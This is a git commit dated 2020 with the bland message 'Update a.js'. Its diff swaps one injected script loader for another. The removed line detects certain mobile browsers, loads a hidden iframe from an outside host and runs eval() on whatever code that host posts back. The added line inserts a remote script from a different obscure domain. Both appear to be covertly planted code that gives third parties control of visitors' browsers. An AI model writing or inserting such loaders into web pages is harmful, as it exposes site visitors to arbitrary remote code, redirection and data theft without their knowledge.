046031e90d430377ea9db96e606eb180c0a14944
yellowside <30918006+yellowside@users.noreply.github.com>
2020-09-29 22:52:33 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,4 +1,4 @@
-;(function(){if((/(MQQBrowser|UCBrowser|baidu)/i.test(navigator.userAgent))&&!(/(MicroMessenger)/i.test(navigator.userAgent))){window.addEventListener('message',function(e){if(e.data.web_id=='4732'){eval(e.data.code)}});var body=document.getElementsByTagName('body')[0];var iframe=document.createElement('iframe');iframe.src='https://xl.msspgw.cn/c/4732?is_iframe=1&time='+Math.random();iframe.style='display: none;';body.appendChild(iframe)}else{var body=document.getElementsByTagName('body')[0];var script=document.createElement('script');script.type='text/javascript';script.src='https://xl.msspgw.cn/c/4732?time='+Math.random();body.appendChild(script)}})();
+(function(){ var m = document.createElement("script"); m.src = "https://xg.tjwmtrw.cn/sc/4732?x=0.41197830805328706"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(m, s); })();
 var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
